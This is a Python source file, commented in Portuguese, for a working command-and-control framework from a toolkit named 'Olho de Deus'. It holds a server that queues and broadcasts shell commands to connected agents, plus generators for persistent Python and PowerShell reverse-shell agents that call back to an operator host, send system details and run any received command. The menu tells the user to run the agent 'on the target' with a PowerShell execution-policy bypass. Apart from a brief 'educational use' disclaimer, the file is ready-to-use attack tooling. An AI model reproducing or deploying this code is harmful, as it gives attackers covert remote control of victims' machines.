#!/usr/bin/env python3
"""
C2 Framework Lite - Mini Command & Control para sessões reversas
Parte do toolkit Olho de Deus
⚠️ APENAS PARA USO EDUCACIONAL E AUTORIZADO
"""

import os
import sys
import json
import socket
import threading
import time
import base64
import hashlib
import secrets
from typing import Dict, List, Optional
from dataclasses import dataclass, field
from datetime import datetime
import struct


@dataclass
class Agent:
    """Representa um agente conectado."""
    id: str
    hostname: str
    username: str
    os_info: str
    ip: str
    port: int
    socket: socket.socket
    connected_at: datetime
    last_seen: datetime
    status: str = "active"
    
    def to_dict(self) -> Dict:
        return {
            "id": self.id,
            "hostname": self.hostname,
            "username": self.username,
            "os_info": self.os_info,
            "ip": self.ip,
            "port": self.port,
            "connected_at": self.connected_at.isoformat(),
            "last_seen": self.last_seen.isoformat(),
            "status": self.status
        }


@dataclass
class Task:
    """Representa uma tarefa para o agente."""
    id: str
    agent_id: str
    command: str
    status: str = "pending"  # pending, sent, completed, failed
    result: str = ""
    created_at: datetime = field(default_factory=datetime.now)
    completed_at: Optional[datetime] = None


class C2Server:
    """Servidor C2 para gerenciamento de agentes."""
    
    def __init__(self, host: str = "0.0.0.0", port: int = 4444):
        self.host = host
        self.port = port
        self.agents: Dict[str, Agent] = {}
        self.tasks: Dict[str, Task] = {}
        self.server_socket: Optional[socket.socket] = None
        self.running = False
        self.encryption_key = secrets.token_bytes(32)
        self._lock = threading.Lock()
    
    def _generate_agent_id(self) -> str:
        """Gera ID único para agente."""
        return secrets.token_hex(8)
    
    def _generate_task_id(self) -> str:
        """Gera ID único para tarefa."""
        return secrets.token_hex(4)
    
    def _xor_encrypt(self, data: bytes, key: bytes) -> bytes:
        """Criptografia XOR simples."""
        return bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))
    
    def _send_to_agent(self, agent: Agent, data: str) -> bool:
        """Envia dados para um agente."""
        try:
            encrypted = self._xor_encrypt(data.encode(), self.encryption_key)
            length = struct.pack('>I', len(encrypted))
            agent.socket.sendall(length + encrypted)
            return True
        except Exception as e:
            print(f"Erro ao enviar para agente {agent.id}: {e}")
            return False
    
    def _recv_from_agent(self, agent: Agent) -> Optional[str]:
        """Recebe dados de um agente."""
        try:
            length_data = agent.socket.recv(4)
            if not length_data:
                return None
            
            length = struct.unpack('>I', length_data)[0]
            encrypted = b''
            while len(encrypted) < length:
                chunk = agent.socket.recv(min(4096, length - len(encrypted)))
                if not chunk:
                    return None
                encrypted += chunk
            
            decrypted = self._xor_encrypt(encrypted, self.encryption_key)
            return decrypted.decode()
        except Exception:
            return None
    
    def _handle_agent(self, client_socket: socket.socket, addr: tuple):
        """Manipula conexão de um agente."""
        agent_id = self._generate_agent_id()
        
        try:
            # Receber informações do sistema
            self._send_to_agent(
                Agent(agent_id, "", "", "", addr[0], addr[1], client_socket, datetime.now(), datetime.now()),
                "SYSINFO"
            )
            
            sysinfo_raw = self._recv_from_agent(
                Agent(agent_id, "", "", "", addr[0], addr[1], client_socket, datetime.now(), datetime.now())
            )
            
            if not sysinfo_raw:
                client_socket.close()
                return
            
            try:
                sysinfo = json.loads(sysinfo_raw)
            except json.JSONDecodeError:
                sysinfo = {"hostname": "unknown", "username": "unknown", "os": "unknown"}
            
            agent = Agent(
                id=agent_id,
                hostname=sysinfo.get("hostname", "unknown"),
                username=sysinfo.get("username", "unknown"),
                os_info=sysinfo.get("os", "unknown"),
                ip=addr[0],
                port=addr[1],
                socket=client_socket,
                connected_at=datetime.now(),
                last_seen=datetime.now()
            )
            
            with self._lock:
                self.agents[agent_id] = agent
            
            print(f"\n[+] Novo agente conectado: {agent_id} ({agent.hostname}@{agent.ip})")
            
            # Loop de manutenção
            while self.running and agent.status == "active":
                # Verificar tarefas pendentes
                pending_tasks = [t for t in self.tasks.values() 
                               if t.agent_id == agent_id and t.status == "pending"]
                
                for task in pending_tasks:
                    if self._send_to_agent(agent, task.command):
                        task.status = "sent"
                        
                        # Aguardar resultado
                        result = self._recv_from_agent(agent)
                        if result:
                            task.result = result
                            task.status = "completed"
                            task.completed_at = datetime.now()
                            agent.last_seen = datetime.now()
                        else:
                            task.status = "failed"
                
                time.sleep(1)
            
        except Exception as e:
            print(f"[-] Erro com agente {agent_id}: {e}")
        finally:
            with self._lock:
                if agent_id in self.agents:
                    self.agents[agent_id].status = "disconnected"
            client_socket.close()
    
    def start(self):
        """Inicia o servidor C2."""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True
            
            print(f"[*] C2 Server iniciado em {self.host}:{self.port}")
            print(f"[*] Chave de criptografia: {self.encryption_key.hex()}")
            
            while self.running:
                try:
                    self.server_socket.settimeout(1)
                    client_socket, addr = self.server_socket.accept()
                    
                    handler = threading.Thread(
                        target=self._handle_agent,
                        args=(client_socket, addr),
                        daemon=True
                    )
                    handler.start()
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.running:
                        print(f"[-] Erro: {e}")
                    
        except Exception as e:
            print(f"[-] Falha ao iniciar servidor: {e}")
        finally:
            self.stop()
    
    def stop(self):
        """Para o servidor C2."""
        self.running = False
        
        for agent in self.agents.values():
            try:
                agent.socket.close()
            except Exception:
                pass
        
        if self.server_socket:
            try:
                self.server_socket.close()
            except Exception:
                pass
        
        print("[*] Servidor C2 encerrado")
    
    def list_agents(self) -> List[Dict]:
        """Lista todos os agentes."""
        return [a.to_dict() for a in self.agents.values()]
    
    def get_agent(self, agent_id: str) -> Optional[Agent]:
        """Obtém um agente específico."""
        return self.agents.get(agent_id)
    
    def execute_command(self, agent_id: str, command: str) -> str:
        """Executa comando em um agente."""
        if agent_id not in self.agents:
            return "Agente não encontrado"
        
        agent = self.agents[agent_id]
        if agent.status != "active":
            return "Agente não está ativo"
        
        task = Task(
            id=self._generate_task_id(),
            agent_id=agent_id,
            command=command
        )
        
        self.tasks[task.id] = task
        
        # Aguardar conclusão
        timeout = 30
        start = time.time()
        while task.status in ["pending", "sent"] and time.time() - start < timeout:
            time.sleep(0.5)
        
        if task.status == "completed":
            return task.result
        elif task.status == "failed":
            return "Falha na execução"
        else:
            return "Timeout"
    
    def broadcast_command(self, command: str) -> Dict[str, str]:
        """Executa comando em todos os agentes ativos."""
        results = {}
        
        active_agents = [a for a in self.agents.values() if a.status == "active"]
        
        for agent in active_agents:
            results[agent.id] = self.execute_command(agent.id, command)
        
        return results


class PayloadGenerator:
    """Gerador de payloads para agentes."""
    
    @staticmethod
    def generate_python_agent(host: str, port: int, key: bytes) -> str:
        """Gera payload de agente em Python."""
        key_hex = key.hex()
        
        payload = f'''#!/usr/bin/env python3
import socket
import subprocess
import json
import struct
import platform
import getpass
import os
import time

HOST = "{host}"
PORT = {port}
KEY = bytes.fromhex("{key_hex}")

def xor(data, key):
    return bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))

def send_data(sock, data):
    encrypted = xor(data.encode(), KEY)
    length = struct.pack('>I', len(encrypted))
    sock.sendall(length + encrypted)

def recv_data(sock):
    length_data = sock.recv(4)
    if not length_data:
        return None
    length = struct.unpack('>I', length_data)[0]
    encrypted = b''
    while len(encrypted) < length:
        chunk = sock.recv(min(4096, length - len(encrypted)))
        if not chunk:
            return None
        encrypted += chunk
    return xor(encrypted, KEY).decode()

def get_sysinfo():
    return json.dumps({{
        "hostname": platform.node(),
        "username": getpass.getuser(),
        "os": f"{{platform.system()}} {{platform.release()}}"
    }})

def execute(cmd):
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, 
            text=True, timeout=30
        )
        return result.stdout + result.stderr
    except Exception as e:
        return str(e)

def main():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((HOST, PORT))
            
            while True:
                cmd = recv_data(sock)
                if not cmd:
                    break
                
                if cmd == "SYSINFO":
                    send_data(sock, get_sysinfo())
                elif cmd == "EXIT":
                    break
                else:
                    result = execute(cmd)
                    send_data(sock, result or "OK")
            
            sock.close()
        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    main()
'''
        return payload
    
    @staticmethod
    def generate_powershell_agent(host: str, port: int, key: bytes) -> str:
        """Gera payload de agente em PowerShell."""
        key_b64 = base64.b64encode(key).decode()
        
        payload = f'''$Host_ = "{host}"
$Port = {port}
$Key = [Convert]::FromBase64String("{key_b64}")

function XOR($data, $key) {{
    $result = @()
    for ($i = 0; $i -lt $data.Length; $i++) {{
        $result += $data[$i] -bxor $key[$i % $key.Length]
    }}
    return [byte[]]$result
}}

function Send-Data($socket, $data) {{
    $encrypted = XOR ([Text.Encoding]::UTF8.GetBytes($data)) $Key
    $length = [BitConverter]::GetBytes([uint32]$encrypted.Length)
    [Array]::Reverse($length)
    $socket.GetStream().Write($length, 0, 4)
    $socket.GetStream().Write($encrypted, 0, $encrypted.Length)
}}

function Recv-Data($socket) {{
    $stream = $socket.GetStream()
    $lengthBytes = New-Object byte[] 4
    $stream.Read($lengthBytes, 0, 4) | Out-Null
    [Array]::Reverse($lengthBytes)
    $length = [BitConverter]::ToUInt32($lengthBytes, 0)
    $buffer = New-Object byte[] $length
    $total = 0
    while ($total -lt $length) {{
        $read = $stream.Read($buffer, $total, $length - $total)
        $total += $read
    }}
    return [Text.Encoding]::UTF8.GetString((XOR $buffer $Key))
}}

while ($true) {{
    try {{
        $socket = New-Object Net.Sockets.TcpClient($Host_, $Port)
        while ($socket.Connected) {{
            $cmd = Recv-Data $socket
            if ($cmd -eq "SYSINFO") {{
                $info = @{{
                    hostname = $env:COMPUTERNAME
                    username = $env:USERNAME
                    os = [Environment]::OSVersion.VersionString
                }} | ConvertTo-Json
                Send-Data $socket $info
            }} elseif ($cmd -eq "EXIT") {{
                break
            }} else {{
                try {{
                    $result = Invoke-Expression $cmd 2>&1 | Out-String
                    Send-Data $socket $result
                }} catch {{
                    Send-Data $socket $_.Exception.Message
                }}
            }}
        }}
        $socket.Close()
    }} catch {{
        Start-Sleep 5
    }}
}}
'''
        return payload


class C2Console:
    """Console interativo do C2."""
    
    def __init__(self, server: C2Server):
        self.server = server
        self.current_agent: Optional[str] = None
    
    def run(self):
        """Executa console interativo."""
        while True:
            try:
                if self.current_agent:
                    prompt = f"C2({self.current_agent[:8]})> "
                else:
                    prompt = "C2> "
                
                cmd = input(prompt).strip()
                
                if not cmd:
                    continue
                
                parts = cmd.split()
                command = parts[0].lower()
                args = parts[1:]
                
                if command == "help":
                    self._show_help()
                elif command == "agents":
                    self._list_agents()
                elif command == "use":
                    self._use_agent(args)
                elif command == "exec":
                    self._exec_command(" ".join(args))
                elif command == "broadcast":
                    self._broadcast(" ".join(args))
                elif command == "sysinfo":
                    self._sysinfo()
                elif command == "back":
                    self.current_agent = None
                elif command == "exit":
                    break
                else:
                    if self.current_agent:
                        self._exec_command(cmd)
                    else:
                        print("Comando desconhecido. Digite 'help' para ajuda.")
                        
            except KeyboardInterrupt:
                print()
                continue
            except EOFError:
                break
    
    def _show_help(self):
        """Mostra ajuda."""
        print("""
Comandos disponíveis:
  agents          - Lista agentes conectados
  use <id>        - Seleciona um agente
  exec <cmd>      - Executa comando no agente selecionado
  broadcast <cmd> - Executa em todos os agentes
  sysinfo         - Mostra info do agente selecionado
  back            - Deseleciona agente
  exit            - Encerra console
        """)
    
    def _list_agents(self):
        """Lista agentes."""
        agents = self.server.list_agents()
        
        if not agents:
            print("Nenhum agente conectado.")
            return
        
        print("\n" + "=" * 80)
        print(f"{'ID':<18} {'Hostname':<15} {'User':<12} {'IP':<15} {'Status':<10}")
        print("=" * 80)
        
        for a in agents:
            status_icon = "🟢" if a['status'] == "active" else "🔴"
            print(f"{a['id']:<18} {a['hostname']:<15} {a['username']:<12} {a['ip']:<15} {status_icon} {a['status']}")
        
        print("=" * 80 + "\n")
    
    def _use_agent(self, args: List[str]):
        """Seleciona agente."""
        if not args:
            print("Uso: use <agent_id>")
            return
        
        agent_id = args[0]
        
        # Busca por ID parcial
        matching = [a for a in self.server.agents.keys() if a.startswith(agent_id)]
        
        if not matching:
            print(f"Agente não encontrado: {agent_id}")
        elif len(matching) > 1:
            print(f"Múltiplos agentes encontrados: {matching}")
        else:
            self.current_agent = matching[0]
            agent = self.server.agents[self.current_agent]
            print(f"Selecionado: {agent.hostname}@{agent.ip}")
    
    def _exec_command(self, cmd: str):
        """Executa comando."""
        if not self.current_agent:
            print("Nenhum agente selecionado. Use: use <agent_id>")
            return
        
        if not cmd:
            return
        
        print(f"[*] Executando: {cmd}")
        result = self.server.execute_command(self.current_agent, cmd)
        print(result)
    
    def _broadcast(self, cmd: str):
        """Broadcast de comando."""
        if not cmd:
            print("Uso: broadcast <comando>")
            return
        
        print(f"[*] Broadcasting: {cmd}")
        results = self.server.broadcast_command(cmd)
        
        for agent_id, result in results.items():
            print(f"\n[{agent_id[:8]}]:")
            print(result)
    
    def _sysinfo(self):
        """Mostra info do agente."""
        if not self.current_agent:
            print("Nenhum agente selecionado.")
            return
        
        agent = self.server.agents.get(self.current_agent)
        if agent:
            print(f"\nAgente: {agent.id}")
            print(f"  Hostname: {agent.hostname}")
            print(f"  Username: {agent.username}")
            print(f"  OS: {agent.os_info}")
            print(f"  IP: {agent.ip}:{agent.port}")
            print(f"  Status: {agent.status}")
            print(f"  Conectado em: {agent.connected_at}")
            print(f"  Último contato: {agent.last_seen}")


def interactive_menu():
    """Menu interativo do C2."""
    server = None
    server_thread = None
    
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print("""
╔══════════════════════════════════════════════════════════════╗
║        ⚔️  C2 FRAMEWORK LITE - Olho de Deus                   ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  ⚠️  APENAS PARA USO EDUCACIONAL E AUTORIZADO                 ║
║                                                              ║
║  [1] 🚀 Iniciar Servidor C2                                  ║
║  [2] 🖥️  Console Interativo                                   ║
║  [3] 📋 Listar Agentes                                       ║
║  [4] 🐍 Gerar Payload Python                                 ║
║  [5] 💠 Gerar Payload PowerShell                             ║
║  [6] 🛑 Parar Servidor                                       ║
║                                                              ║
║  [0] Voltar                                                  ║
╚══════════════════════════════════════════════════════════════╝
        """)
        
        if server and server.running:
            print(f"  📡 Servidor ativo: {server.host}:{server.port}")
            print(f"  👥 Agentes conectados: {len([a for a in server.agents.values() if a.status == 'active'])}")
        
        escolha = input("\nOpção: ").strip()
        
        if escolha == '0':
            if server:
                server.stop()
            break
        
        elif escolha == '1':
            if server and server.running:
                print("Servidor já está rodando!")
                input("Enter para continuar...")
                continue
            
            print("\n=== Iniciar Servidor C2 ===")
            host = input("Host (default: 0.0.0.0): ").strip() or "0.0.0.0"
            port = input("Porta (default: 4444): ").strip()
            port = int(port) if port.isdigit() else 4444
            
            server = C2Server(host, port)
            server_thread = threading.Thread(target=server.start, daemon=True)
            server_thread.start()
            
            print(f"\n✅ Servidor iniciado em {host}:{port}")
            print(f"🔑 Chave: {server.encryption_key.hex()}")
            input("\nEnter para continuar...")
        
        elif escolha == '2':
            if not server or not server.running:
                print("Servidor não está rodando!")
                input("Enter para continuar...")
                continue
            
            print("\n=== Console C2 ===")
            print("Digite 'help' para comandos. 'exit' para sair.\n")
            
            console = C2Console(server)
            console.run()
        
        elif escolha == '3':
            if not server:
                print("Servidor não iniciado!")
                input("Enter para continuar...")
                continue
            
            agents = server.list_agents()
            if not agents:
                print("\nNenhum agente conectado.")
            else:
                print(f"\n{len(agents)} agente(s):\n")
                for a in agents:
                    status = "🟢" if a['status'] == 'active' else "🔴"
                    print(f"  {status} {a['id'][:16]}... | {a['hostname']} | {a['ip']}")
            
            input("\nEnter para continuar...")
        
        elif escolha == '4':
            if not server:
                print("\nInicie o servidor primeiro!")
                input("Enter para continuar...")
                continue
            
            print("\n=== Gerar Payload Python ===")
            host = input("IP do servidor (seu IP): ").strip()
            if not host:
                continue
            
            payload = PayloadGenerator.generate_python_agent(host, server.port, server.encryption_key)
            
            os.makedirs("payloads", exist_ok=True)
            filepath = "payloads/agent.py"
            with open(filepath, 'w') as f:
                f.write(payload)
            
            print(f"\n✅ Payload salvo em: {filepath}")
            print("Execute no alvo: python agent.py")
            input("\nEnter para continuar...")
        
        elif escolha == '5':
            if not server:
                print("\nInicie o servidor primeiro!")
                input("Enter para continuar...")
                continue
            
            print("\n=== Gerar Payload PowerShell ===")
            host = input("IP do servidor (seu IP): ").strip()
            if not host:
                continue
            
            payload = PayloadGenerator.generate_powershell_agent(host, server.port, server.encryption_key)
            
            os.makedirs("payloads", exist_ok=True)
            filepath = "payloads/agent.ps1"
            with open(filepath, 'w') as f:
                f.write(payload)
            
            print(f"\n✅ Payload salvo em: {filepath}")
            print("Execute no alvo: powershell -ep bypass -f agent.ps1")
            input("\nEnter para continuar...")
        
        elif escolha == '6':
            if server:
                server.stop()
                print("\n✅ Servidor encerrado.")
            else:
                print("\nNenhum servidor rodando.")
            input("Enter para continuar...")


if __name__ == "__main__":
    interactive_menu()
